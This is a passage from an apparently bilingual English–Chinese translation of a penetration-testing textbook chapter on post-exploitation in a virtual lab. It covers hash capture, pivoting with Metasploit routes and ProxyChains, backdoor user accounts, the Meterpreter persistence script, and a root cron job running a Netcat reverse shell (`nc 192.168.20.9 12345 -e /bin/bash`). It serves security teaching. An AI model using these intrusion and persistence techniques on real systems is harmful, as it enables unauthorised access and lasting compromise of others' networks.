    "第9章. 密码攻击")中处理的常规LM和NTLM Windows哈希有所不同。而当你查看*JOHNPWFILE*时，你会看到它的格式与我们之前在John
    the Ripper中看到的有所不同。
- en: '[PRE51]'
  id: totrans-255
  prefs: []
  type: TYPE_PRE
  zh: '[PRE51]'
- en: In particular, the hash entry has taken note of the `CHALLENGE` option set in
    Metasploit. Though the user *secret* has a local hash on our Windows XP target
    that would save us the trouble of cracking NETLM and NETNTLM hashes, this is a
    useful trick for grabbing password hashes when working with domain user accounts,
    which store their password hashes only on the domain controllers.
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 具体来说，哈希条目已经记录了在Metasploit中设置的`CHALLENGE`选项。尽管用户*secret*在我们的Windows XP目标上有一个本地哈希，这可以省去我们破解NETLM和NETNTLM哈希的麻烦，但这是一个有用的小技巧，当你处理域用户账户时，它可以帮助你抓取密码哈希，因为域用户的密码哈希仅存储在域控制器上。
- en: Pivoting
  id: totrans-257
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 横向渗透
- en: Now let’s see if we can use access to a system to gain access to another network
    entirely. Typically an organization has only a few Internet-facing systems—hosting
    services that need to be made available to the Internet such as web servers, email,
    VPNs, and so on. These services may be hosted by a provider such as Google or
    GoDaddy, or they may be hosted in house. If they are hosted in house, gaining
    access to them from the Internet may give you access to the internal network.
    Ideally their internal network will be segmented by business unit, level of sensitivity,
    and so on, such that access to one machine does not give direct network access
    to all machines in the enterprise.
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们看看能否利用访问一个系统来获得对另一个网络的访问权限。通常情况下，一个组织只有少数几个面向互联网的系统——这些系统通常需要向互联网提供服务，例如Web服务器、电子邮件、VPN等。这些服务可能由如Google或GoDaddy等提供商托管，也可能是自建的。如果是自建的，通过互联网访问它们可能会让你进入内部网络。理想情况下，它们的内部网络会根据业务单元、敏感性等级等进行分段，以确保访问一台机器并不会直接访问到企业中所有的机器。
- en: Note
  id: totrans-259
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注
- en: Internet-facing systems may be *dual homed*, or a member of multiple networks,
    namely the Internet and an internal network. A security best practice is to keep
    dual-homed systems segregated from sensitive internal network resources in a demilitarized
    zone, but I have performed penetration tests for clients who have Internet-facing
    systems as part of their internal domain. All I had to do was exploit their web
    application, which had a default password for the administrative account, and
    upload a PHP shell as we did to XAMPP in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation"),
    and suddenly I had access to a system on their internal domain. Hopefully, most
    of your clients will require a few more steps between piercing the perimeter and
    domain access.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 面向互联网的系统可能是*双网接入*的，或者是多个网络的成员，即互联网和内部网络。一个安全的最佳实践是将双网接入的系统与敏感的内部网络资源隔离在一个**非军事区**中，但我曾为一些客户进行渗透测试，他们的面向互联网的系统是其内部域的一部分。我所做的就是利用他们的Web应用程序，这个程序的管理员账户有一个默认密码，然后上传一个PHP
    shell，就像我们在[第8章](ch08.xhtml "第8章. 利用")中对XAMPP所做的那样，突然间我就获得了对他们内部域系统的访问权限。希望你们的大多数客户在突破外围防护和访问域之间需要更多的步骤。
- en: When we set up our Windows 7 target in [Chapter 1](ch01.xhtml "Chapter 1. Setting
    Up Your Virtual Lab"), we gave it two virtual network adapters. We connected one
    to the bridged network where it could talk to the other targets and our Kali virtual
    machine. The other virtual adapter is connected to the host-only network. For
    this exercise, switch the Windows XP target to the host-only network so it is
    no longer accessible by the Kali system. (For more information on changing virtual
    network settings, see [Creating the Windows 7 Target](ch01.xhtml#creating_the_windows_7_target
    "Creating the Windows 7 Target").)
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们在[第 1 章](ch01.xhtml "第 1 章. 设置虚拟实验室")中设置 Windows 7 目标系统时，我们为其配置了两个虚拟网络适配器。我们将一个适配器连接到桥接网络，使其能够与其他目标系统和
    Kali 虚拟机通信。另一个虚拟适配器连接到仅主机网络。对于本练习，请将 Windows XP 目标系统切换到仅主机网络，这样 Kali 系统就无法访问它了。（有关更改虚拟网络设置的更多信息，请参见[创建
    Windows 7 目标](ch01.xhtml#creating_the_windows_7_target "创建 Windows 7 目标")）。
- en: 'Though this is a Windows system, Meterpreter allows us to use the `ifconfig`
    command to see networking information. As shown in [Example 13-28](ch13.xhtml#dual-homed_system_networking_information
    "Example 13-28. Dual-homed system networking information"), the Windows 7 target
    is part of two networks: the 192.168.20.0/24 network, which also includes our
    Kali system, and the 172.16.85.0/24 network, which our Kali system does not have
    access to.'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管这是一个 Windows 系统，Meterpreter 允许我们使用`ifconfig`命令查看网络信息。如[示例 13-28](ch13.xhtml#dual-homed_system_networking_information
    "示例 13-28. 双网卡系统的网络信息")所示，Windows 7 目标系统是两个网络的一部分：192.168.20.0/24 网络，它也包括我们的 Kali
    系统，以及 172.16.85.0/24 网络，Kali 系统无法访问该网络。
- en: Example 13-28. Dual-homed system networking information
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-28. 双网卡系统的网络信息
- en: '[PRE52]'
  id: totrans-264
  prefs: []
  type: TYPE_PRE
  zh: '[PRE52]'
- en: We can’t attack any systems in the 172.16.85.0 network directly from Kali. However,
    because we have access to the Windows 7 target, we can use it as a jumping-off
    point, or *pivot*, to further explore this second network, as shown in [Figure 13-3](ch13.xhtml#pivoting_through_an_exploited_system
    "Figure 13-3. Pivoting through an exploited system").
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不能直接从 Kali 攻击 172.16.85.0 网络中的任何系统。然而，由于我们可以访问 Windows 7 目标系统，我们可以将其用作跳板，或称为
    *枢纽*，进一步探索这个第二个网络，如[图 13-3](ch13.xhtml#pivoting_through_an_exploited_system "图
    13-3. 通过被利用的系统进行枢纽攻击")所示。
- en: '![Pivoting through an exploited system](httpatomoreillycomsourcenostarchimages2030424.png.jpg)Figure 13-3. Pivoting
    through an exploited system'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: '![通过被利用的系统进行枢纽攻击](httpatomoreillycomsourcenostarchimages2030424.png.jpg)图 13-3.
    通过被利用的系统进行枢纽攻击'
- en: 'At this point we could start uploading our hack tools to the Windows 7 target
    to begin the penetration test on the 172.16.85.0 network, but that attempt would
    likely be caught by antivirus software, and we’d have to clean up the mess left
    behind. Metasploit gives us another option: We can route all of the traffic for
    our target network through an open Metasploit session.'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个阶段，我们可以开始将我们的攻击工具上传到 Windows 7 目标系统，以便对 172.16.85.0 网络进行渗透测试，但这种尝试很可能会被杀毒软件检测到，我们还需要清理留下的痕迹。Metasploit
    为我们提供了另一种选择：我们可以通过一个打开的 Metasploit 会话将所有目标网络的流量路由到目标网络。
- en: Adding a Route in Metasploit
  id: totrans-268
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 在 Metasploit 中添加路由
- en: The `route` command in Metasploit tells Metasploit where to route traffic. Instead
    of routing traffic to an IP address, we send traffic destined for a network through
    a specific open session. In this case, we want to send all traffic headed to the
    172.16.85.0 network through the Windows 7 session. The syntax for the route command
    in Metasploit is `route add` *`network <subnet`* *`mask> <session id>`*.
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 中的`route`命令告诉 Metasploit 应该将流量路由到哪里。我们不是将流量路由到一个 IP 地址，而是将流量定向到一个特定的开放会话。在这种情况下，我们希望将所有流向
    172.16.85.0 网络的流量通过 Windows 7 会话进行路由。Metasploit 中 `route` 命令的语法为 `route add` *`network
    <subnet`* *`mask> <session id>`*。
- en: '[PRE53]'
  id: totrans-270
  prefs: []
  type: TYPE_PRE
  zh: '[PRE53]'
- en: Now any traffic we send from Metasploit to the 172.16.85.0 network will automatically
    be routed through the Windows 7 session (session 2 in my case). We can set options
    such as `RHOST` or `RHOSTS` to systems in this network, and Metasploit will get
    traffic to the right place.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们从 Metasploit 发送到 172.16.85.0 网络的任何流量都将自动通过 Windows 7 会话（在我的例子中是会话 2）进行路由。我们可以设置
    `RHOST` 或 `RHOSTS` 等选项，以便将流量发送到该网络中的系统，Metasploit 将确保流量到达正确的位置。
- en: Metasploit Port Scanners
  id: totrans-272
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Metasploit 端口扫描器
- en: One of the first things we did when information gathering in [Chapter 5](ch05.xhtml
    "Chapter 5. Information Gathering") was to port scan our targets with Nmap. We
    won’t be able to use external tools with our Metasploit route, but luckily Metasploit
    has some port-scanning modules we can use instead, like the *scanner/portscan/tcp*
    module, which will perform a simple TCP port scan, as shown in [Example 13-29](ch13.xhtml#port_scanning_with_metasploit
    "Example 13-29. Port scanning with Metasploit").
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第五章](ch05.xhtml "第五章. 信息收集")中，我们在信息收集时做的第一件事之一就是使用 Nmap 对目标进行端口扫描。由于我们通过 Metasploit
    路由无法使用外部工具，但幸运的是，Metasploit 有一些可以使用的端口扫描模块，例如 *scanner/portscan/tcp* 模块，它将执行一个简单的
    TCP 端口扫描，如[示例 13-29](ch13.xhtml#port_scanning_with_metasploit "示例 13-29. 使用 Metasploit
    进行端口扫描")所示。
- en: Example 13-29. Port scanning with Metasploit
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-29. 使用 Metasploit 进行端口扫描
- en: '[PRE54]'
  id: totrans-275
  prefs: []
  type: TYPE_PRE
  zh: '[PRE54]'
- en: Set the `RHOSTS` option as usual for auxiliary modules. By default Metasploit
    scans port 1-10000 ❶, though you can change this option if you wish.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 像往常一样为辅助模块设置 `RHOSTS` 选项。默认情况下，Metasploit 扫描 1-10000 端口 ❶，不过你可以根据需要更改此选项。
- en: Though Metasploit’s port scanners are not as powerful as Nmap’s, we can at least
    see that the SMB port is open. From here we might run the *auxiliary/scanner/smb/smb_version*
    module followed by the `check` function with the *windows/smb/ms08_067_netapi*
    module to lead us toward exploiting the Windows XP target with the MS08-067 exploit
    through a pivot.
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管 Metasploit 的端口扫描器没有 Nmap 强大，但我们至少可以看到 SMB 端口是开放的。从这里，我们可以运行 *auxiliary/scanner/smb/smb_version*
    模块，然后使用 `check` 函数与 *windows/smb/ms08_067_netapi* 模块一起，带领我们通过跳板利用 MS08-067 漏洞攻击
    Windows XP 目标。
- en: Running an Exploit through a Pivot
  id: totrans-278
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 通过跳板运行利用代码
- en: Because our Windows XP and Kali systems are on different networks, a reverse
    payload won’t work for our exploit because the Windows XP target won’t know how
    to route traffic back to 192.168.20.9\. (Of course, if our Kali system was on
    the Internet and the internal network we are attacking could route to the Internet,
    that would not be the case. However, here our host-only network does not know
    how to route to our bridged network.) Instead, we’ll use a *bind payload*. Metasploit’s
    bind handler will have no trouble routing through the pivot we set up. The *windows/meterpreter/bind_tcp*
    payload will work as shown in [Example 13-30](ch13.xhtml#exploiting_through_a_pivot
    "Example 13-30. Exploiting through a pivot").
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们的 Windows XP 和 Kali 系统位于不同的网络上，反向有效载荷对我们的利用无法奏效，因为 Windows XP 目标无法将流量路由回
    192.168.20.9。（当然，如果我们的 Kali 系统位于互联网，且我们攻击的内部网络能够路由到互联网，那就不是这种情况了。然而，在这里我们的主机仅网络无法路由到桥接网络。）因此，我们将使用
    *bind 有效载荷*。Metasploit 的 bind 处理器能够轻松通过我们设置的跳板进行路由。*windows/meterpreter/bind_tcp*
    有效载荷将如[示例 13-30](ch13.xhtml#exploiting_through_a_pivot "示例 13-30. 通过跳板进行利用")所示工作。
- en: Example 13-30. Exploiting through a pivot
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-30. 通过跳板进行利用
- en: '[PRE55]'
  id: totrans-281
  prefs: []
  type: TYPE_PRE
  zh: '[PRE55]'
- en: We’ve gotten another session, this time through a pivot.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 我们又进行了一次会话，这次是通过跳板进行的。
- en: Socks4a and ProxyChains
  id: totrans-283
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Socks4a 和 ProxyChains
- en: 'Pivoting through Metasploit is all well and good, but we’re limited to using
    Metasploit modules. Perhaps there is a way to proxy other tools through Metasploit’s
    pivot? In fact there is: using the ProxyChains tool (which redirects traffic to
    proxy servers) to send our traffic from other Kali tools through Metasploit.'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 Metasploit 进行跳板操作很好，但我们只能使用 Metasploit 模块。或许有办法通过 Metasploit 的跳板代理其他工具？事实上，确实有方法：使用
    ProxyChains 工具（它将流量重定向到代理服务器），通过 Metasploit 将我们从其他 Kali 工具发送的流量进行代理。
- en: But first we need to set up a proxy server in Metasploit. Like the SMB server
    module we used to capture NETLM and NETNTLM hashes earlier in this chapter, Metasploit
    also has a Socks4a proxy server module (*auxiliary/server/socks4a*). [Example 13-31](ch13.xhtml#setting_up_a_socks4a_proxy_server_in_met
    "Example 13-31. Setting up a Socks4a proxy server in Metasploit") shows how to
    set up the proxy server.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 但首先，我们需要在 Metasploit 中设置一个代理服务器。就像我们在本章前面使用的 SMB 服务器模块来捕获 NETLM 和 NETNTLM 哈希一样，Metasploit
    也有一个 Socks4a 代理服务器模块 (*auxiliary/server/socks4a*)。[示例 13-31](ch13.xhtml#setting_up_a_socks4a_proxy_server_in_met
    "示例 13-31. 在 Metasploit 中设置 Socks4a 代理服务器")展示了如何设置代理服务器。
- en: Example 13-31. Setting up a Socks4a proxy server in Metasploit
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-31. 在 Metasploit 中设置 Socks4a 代理服务器
- en: '[PRE56]'
  id: totrans-287
  prefs: []
  type: TYPE_PRE
  zh: '[PRE56]'
- en: Leave the options as the defaults, but note that the server will be listening
    on port 1080.
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 保留选项为默认设置，但请注意，服务器将监听 1080 端口。
- en: Now we need to edit the configuration file for ProxyChains at */etc/proxychains.conf*.
    Scroll down to the bottom of the file in an editor, and you should see that by
    default, ProxyChains is set to route traffic to the Tor network as shown here.
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们需要编辑 ProxyChains 的配置文件，文件路径为 */etc/proxychains.conf*。在编辑器中向下滚动到文件底部，你应该会看到默认情况下，ProxyChains
    被设置为将流量路由到 Tor 网络，如下所示。
- en: '[PRE57]'
  id: totrans-290
  prefs: []
  type: TYPE_PRE
  zh: '[PRE57]'
- en: 'We need to change the proxy value to Metasploit’s listening server. Replace
    port 9050 (for Tor) with 1080 (for Metasploit). The line should now read:'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要将代理值更改为 Metasploit 的监听服务器。将端口 9050（用于 Tor）替换为 1080（用于 Metasploit）。该行现在应该显示为：
- en: '[PRE58]'
  id: totrans-292
  prefs: []
  type: TYPE_PRE
  zh: '[PRE58]'
- en: Save the configuration file for ProxyChains. Now we can run tools like Nmap
    from outside Metasploit against our Windows XP target, as long as we preface them
    with `proxychains` as shown in [Example 13-32](ch13.xhtml#running_nmap_through_proxychains
    "Example 13-32. Running Nmap through ProxyChains"). (The Metasploit route must
    still be active because ProxyChains simply redirects the traffic to Metasploit,
    which will forward the traffic through the pivot.)
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: 保存 ProxyChains 的配置文件。现在，只要我们在工具前加上 `proxychains`，就可以像在 [示例 13-32](ch13.xhtml#running_nmap_through_proxychains
    "示例 13-32. 通过 ProxyChains 运行 Nmap") 中所示的那样，从 Metasploit 之外运行工具，如 Nmap，针对我们的 Windows
    XP 目标。（Metasploit 路由必须仍然处于活动状态，因为 ProxyChains 只是将流量重定向到 Metasploit，后者会通过 pivot
    转发流量。）
- en: Example 13-32. Running Nmap through ProxyChains
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-32. 通过 ProxyChains 运行 Nmap
- en: '[PRE59]'
  id: totrans-295
  prefs: []
  type: TYPE_PRE
  zh: '[PRE59]'
- en: '[Example 13-32](ch13.xhtml#running_nmap_through_proxychains "Example 13-32. Running
    Nmap through ProxyChains") shows Nmap being run against the Windows XP host through
    the pivot with ProxyChains. The option `-Pn` tells Nmap not to try to ping through
    the proxy. We start with a simple TCP connect scan (`-sT`) and then run a version
    scan (`-sV`). For the sake of simplicity, I’ve limited the ports to 445 and 446
    with the `-p` option. We see that the connection is `OK` on port 445 ❶ but `denied`
    on port 446 ❷. This makes sense because the SMB server is running on port 445,
    but nothing is running on port 446\. (If any of this is unfamiliar, see [Port
    Scanning with Nmap](ch05.xhtml#port_scanning_with_nmap "Port Scanning with Nmap").)'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: '[示例 13-32](ch13.xhtml#running_nmap_through_proxychains "示例 13-32. 通过 ProxyChains
    运行 Nmap") 显示了通过 Pivot 使用 ProxyChains 对 Windows XP 主机运行 Nmap。选项 `-Pn` 告诉 Nmap 不要尝试通过代理进行
    ping 测试。我们从简单的 TCP 连接扫描（`-sT`）开始，然后运行版本扫描（`-sV`）。为了简便起见，我将端口限制为 445 和 446，通过 `-p`
    选项指定。我们看到在端口 445 上连接是 `OK` ❶，但在端口 446 上则是 `denied` ❷。这很合理，因为 SMB 服务器运行在 445 端口上，而
    446 端口没有任何服务在运行。（如果这些内容不熟悉，请参见 [使用 Nmap 进行端口扫描](ch05.xhtml#port_scanning_with_nmap
    "使用 Nmap 进行端口扫描")。）'
- en: This is just one way to run tools external to Metasploit through a pivot. While
    doing so does slow things down a bit, it can be quite useful to have access to
    other tools in Kali.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是通过 pivot 运行外部工具的一种方式。虽然这样做会稍微降低速度，但能够访问 Kali 中的其他工具非常有用。
- en: Note
  id: totrans-298
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Not all vulnerabilities will be exploitable through a pivot. In general, it
    depends on how the vulnerable protocols work. Another technique to look into is
    SSH tunneling. See my blog at *[http://www.bulbsecurity.com/](http://www.bulbsecurity.com/)*
    for more information.
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 并非所有漏洞都能通过 pivot 进行利用。一般来说，这取决于易受攻击的协议如何工作。另一个需要了解的技术是 SSH 隧道。有关更多信息，请参见我的博客
    *[http://www.bulbsecurity.com/](http://www.bulbsecurity.com/)*。
- en: Persistence
  id: totrans-300
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 持久性
- en: A great thing about our Meterpreter sessions is also a bad thing. Because the
    host process resides entirely in memory, if it dies, our Meterpreter session dies
    as well, and if the system restarts we lose our session. If we lose network access
    to the target, our session may die as well.
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的 Meterpreter 会话的一个优点同时也是一个缺点。因为主机进程完全驻留在内存中，如果它崩溃，我们的 Meterpreter 会话也会随之崩溃，并且如果系统重启，我们将丢失会话。如果我们失去对目标的网络访问，我们的会话可能也会终止。
- en: Rather than re-exploiting the same vulnerability or resending social-engineering
    attacks, it would be ideal if we had a way to regain access in the future. Persistence
    methods can be as simple as adding a user to a system or as advanced as kernel-level
    rootkit that hides itself even from the Windows API making it virtually undetectable.
    In this section we’ll look at a few simple ways to gain persistence on a target
    system to give you a good starting point for your pentests.
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 与其重新利用相同的漏洞或重新发送社会工程学攻击，理想情况下，我们应该有一种方法来在将来恢复访问。持久性方法可以简单到向系统添加一个用户，也可以复杂到内核级
    rootkit，甚至隐藏自己，连 Windows API 都无法检测到，几乎无法被察觉。在本节中，我们将介绍一些在目标系统上获得持久性的方法，帮助你为渗透测试打下良好的基础。
- en: Adding a User
  id: totrans-303
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 添加用户
- en: Perhaps the simplest way to gain persistence is to add a new user. Being able
    to log in to the system directly via SSH, RDP, and so on makes it easy to access
    a system in the future. (As with all other changes you make on your targets, remember
    to delete any added user accounts before finishing the pentest.)
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: 也许获得持久化的最简单方法是添加一个新用户。能够通过 SSH、RDP 等方式直接登录系统，使得未来可以轻松访问该系统。（与对目标进行的所有其他更改一样，记得在完成渗透测试前删除所有新增的用户账户。）
- en: On a Windows system, use `net user` *`username`* *`password`* `/add` to add
    a new user, as shown here.
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 系统上，使用 `net user` *`username`* *`password`* `/add` 来添加一个新用户，如此处所示。
- en: '[PRE60]'
  id: totrans-306
  prefs: []
  type: TYPE_PRE
  zh: '[PRE60]'
- en: We should also add our new user to the relevant groups with the command `net
    localgroup` *`group username`* `/add`. For example, if we want to log in via remote
    desktop, we should add the user to the Remote Desktop Users group. The Administrators
    group is also a good group to add our user to as shown here.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还应该使用命令 `net localgroup` *`group username`* `/add` 将新用户添加到相关的组中。例如，如果我们想通过远程桌面登录，应该将用户添加到远程桌面用户组。管理员组也是一个很好的选择，如此处所示。
- en: '[PRE61]'
  id: totrans-308
  prefs: []
  type: TYPE_PRE
  zh: '[PRE61]'
- en: If your client has a Windows domain, you can add users to the domain and add
    them to domain groups (if you have sufficient privileges) by tacking on `/domain`
    at the end of a command. For example, if you are able to steal a domain administrator’s
    token, you can use the following commands to add a domain administrator account,
    giving you full control of the entire domain.
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你的客户有 Windows 域，可以通过在命令末尾加上 `/domain` 来将用户添加到域中，并将其添加到域组中（前提是你有足够的权限）。例如，如果你能够窃取一个域管理员的令牌，可以使用以下命令添加一个域管理员账户，从而获得整个域的完全控制。
- en: '[PRE62]'
  id: totrans-310
  prefs: []
  type: TYPE_PRE
  zh: '[PRE62]'
- en: On the Linux target, we can use `adduser` to add a user account. Ideally we
    should also add our new user to the sudoers group so we have root privileges.
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Linux 目标系统上，我们可以使用 `adduser` 来添加一个用户账户。理想情况下，我们还应该将新用户添加到 sudoers 组中，以便获得
    root 权限。
- en: Metasploit Persistence
  id: totrans-312
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Metasploit 持久化
- en: The Meterpreter script *persistence* automates the creation of a Windows backdoor
    that will automatically connect back to a Metasploit listener at startup, login,
    and so on, based on the options we use when creating it. The options for the *persistence*
    script are shown in [Example 13-33](ch13.xhtml#meterpreter_persistence_script
    "Example 13-33. Meterpreter persistence script").
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter 脚本 *persistence* 会自动创建一个 Windows 后门，使其根据我们创建时使用的选项，在启动、登录等时自动连接回
    Metasploit 监听器。*persistence* 脚本的选项如 [示例 13-33](ch13.xhtml#meterpreter_persistence_script
    "示例 13-33. Meterpreter 持久化脚本") 所示。
- en: Example 13-33. Meterpreter persistence script
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-33. Meterpreter 持久化脚本
- en: '[PRE63]'
  id: totrans-315
  prefs: []
  type: TYPE_PRE
  zh: '[PRE63]'
- en: As you can see we have a lot of customization options for our persistent payload.
    We can have the persistence agent start at boot or when the user logs in. We can
    set an interval between attempts to connect to the handler. We can change where
    the agent is written on the target system. We can also specify the remote host
    and port for the agent to connect back to. We can even have Metasploit automatically
    set up a handler to catch the incoming connection. In the process of setting up
    persistence, Metasploit has to write the persistence agent to the disk, so Meterpreter
    is no longer completely residing in memory at this point. When the persistence
    agent runs at startup (-`X`), a Visual Basic script is uploaded to the *%TEMP%*
    folder, and a registry entry is added to the list of programs to run at startup.
    When the persistence agent runs upon login (`-U`), the process is similar, but
    the registry entry is set to run at login. When the persistence agent runs as
    a service (`-S`), a Windows system service is created that will call the Visual
    Basic script from *%TEMP%*.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，我们有很多自定义选项可以配置我们的持久化有效载荷。我们可以设置持久化代理在启动时或用户登录时启动。我们可以设置尝试连接处理程序的间隔时间。我们还可以更改代理在目标系统上的写入位置。我们还可以指定远程主机和端口，让代理连接回去。我们甚至可以让
    Metasploit 自动设置一个处理程序来接收传入连接。在设置持久化的过程中，Metasploit 必须将持久化代理写入磁盘，因此 Meterpreter
    此时不再完全驻留在内存中。当持久化代理在启动时运行（-`X`）时，一个 Visual Basic 脚本会被上传到 *%TEMP%* 文件夹，并且在注册表中添加一个程序启动项。当持久化代理在登录时运行（`-U`）时，过程类似，但注册表项被设置为在登录时运行。当持久化代理以服务方式运行（`-S`）时，会创建一个
    Windows 系统服务，从 *%TEMP%* 调用 Visual Basic 脚本。
- en: Let’s run the *persistence* script, as shown in [Example 13-34](ch13.xhtml#running_the_persistence_script
    "Example 13-34. Running the persistence script"), telling the agent to connect
    back to our Kali machine when the user logs in.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们运行 *persistence* 脚本，如[示例 13-34](ch13.xhtml#running_the_persistence_script
    "示例 13-34. 运行持久化脚本")所示，指示代理在用户登录时连接回我们的 Kali 机器。
- en: Example 13-34. Running the persistence script
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-34. 运行持久化脚本
- en: '[PRE64]'
  id: totrans-319
  prefs: []
  type: TYPE_PRE
  zh: '[PRE64]'
- en: After running the script, place the Meterpreter session in the background with
    the Meterpreter command `background`, and set up a handler to catch the persistence
    agent. Now restart the Windows XP target. When it restarts, log in as *georgia*,
    and you should receive another Meterpreter session.
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 运行脚本后，使用 Meterpreter 命令`background`将 Meterpreter 会话放到后台，并设置一个处理程序以捕捉持久化代理。现在重启
    Windows XP 目标机。重启后，以*georgia*身份登录，你应该会收到另一个 Meterpreter 会话。
- en: Note
  id: totrans-321
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If it doesn’t work the first time, try restarting and logging in again.
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 如果第一次没有成功，尝试重新启动并再次登录。
- en: Creating a Linux cron Job
  id: totrans-323
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 创建 Linux cron 作业
- en: On both Windows and Linux systems, we can automatically start tasks at a given
    time. For example, we can set up a `cron` job to automatically run a Metasploit
    payload or even just use Netcat to connect back to us.
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 和 Linux 系统上，我们可以在特定时间自动启动任务。例如，我们可以设置一个 `cron` 作业，自动运行 Metasploit
    负载，甚至只使用 Netcat 连接回我们。
- en: Open */etc/crontab* on your Linux target. The following line will run the command
    `nc 192.168.20.9 12345 -e /bin/bash` every ten minutes of every hour of every
    day of every month—basically every ten minutes. The command will be run as root.
    Add this line to the end of the */etc/crontab* file. (For help, see [Automating
    Tasks with cron Jobs](ch02.xhtml#automating_tasks_with_cron_jobs "Automating Tasks
    with cron Jobs").)
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 打开你的 Linux 目标机上的 */etc/crontab* 文件。以下这一行将每小时、每天、每月的每十分钟运行一次命令 `nc 192.168.20.9
    12345 -e /bin/bash`，也就是说，每十分钟执行一次。该命令将以 root 权限运行。将这一行添加到 */etc/crontab* 文件的末尾。（有关帮助，请参见[使用
    cron 作业自动化任务](ch02.xhtml#automating_tasks_with_cron_jobs "使用 cron 作业自动化任务")。）
- en: '[PRE65]'
  id: totrans-326
  prefs: []
  type: TYPE_PRE
  zh: '[PRE65]'
- en: Now restart the `cron` service by entering **`service cron restart`**. Set up
    a Netcat listener on port 12345 on your Kali machine, and at the next ten-minute
    mark, the `cron` job should run, and you should receive a root shell at your Netcat
    listener.
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 现在通过输入**`service cron restart`**重启 `cron` 服务。在 Kali 机器上设置 Netcat 监听器，监听端口 12345，并在接下来的十分钟标记时，`cron`
    作业应当运行，你应当在 Netcat 监听器上接收到一个 root shell。
- en: Summary
  id: totrans-328
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter we’ve covered just a few post-exploitation techniques, barely
    skimming the surface of the wealth of interesting tools and techniques available.
    We looked at some methods for escalating our privileges on an exploited system.
    We also looked at methods of gathering local information. We studied methods of
    turning access to one system into access to many, including pivoting from one
    network to another through an open session. Finally, we looked at a couple of
    methods for making our access permanent.
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们仅介绍了一些后期利用技巧，几乎只是略微触及了可用的各种有趣工具和技术的表面。我们研究了一些提升权限的方法，针对已被利用的系统进行特权提升。我们还探讨了收集本地信息的方法。我们学习了如何将对一个系统的访问转化为对多个系统的访问，包括通过一个开放会话从一个网络转向另一个网络。最后，我们还介绍了几种使访问变得持久的方法。
